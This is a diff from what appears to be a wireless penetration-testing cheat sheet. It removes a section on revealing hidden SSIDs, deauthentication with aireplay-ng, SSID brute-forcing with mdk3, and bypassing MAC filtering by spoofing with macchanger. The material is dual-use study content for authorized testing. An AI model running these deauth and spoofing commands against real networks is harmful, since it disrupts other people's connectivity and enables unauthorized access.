@@ -115,53 +115,6 @@ airodump-ng --band bg             # b: 2,4GHz (11 Mbps) | g: 2,4GHz (54 Mbps)
 airodump-ng -w capture $interface # Save to file
 ```
 
-### Hidden SSID Discovery
-
-When ESSID = `<length: 0>` in airodump-ng, the SSID is hidden.
-
-- **Passive method** - wait for a client to connect:
-
-```bash
-airodump-ng $interface -c $channel --bssid $bssid -w capture
-```
-
-- **Active method** - Deauth attack, force a client to reconnect:
-
-```bash
-aireplay-ng -0 2 -a $bssid -c $client_mac -D $interface
-```
-
-#### Brute-force SSID
-
-```bash
-# Full brute-force (short SSIDs only)
-mdk3 $interface p -b u -c 1 -t $bssid
-
-# Wordlist attack
-mdk3 $interface p -f /opt/wordlist.txt -t $bssid
-
-# Character sets: u (uppercase), n (digits), a (all), c (mixed case), m (mixed+numbers)
-```
-
-## MAC Filtering Bypass
-
-1. Identify an authorized client MAC from airodump-ng (`STATION` column)
-2. Spoof your MAC
-
-```bash
-# show current mac addr
-macchanger $interface
-
-# (Interface must be down)
-macchanger -m $whitelisted_mac $interface
-```
-
-3. Deauth the legitimate client
-
-```bash
-aireplay-ng -0 1 -a $bssid -c $whitelisted_mac $interface
-```
-
 ## Aircrack-ng Suite
 
 ::: code-group
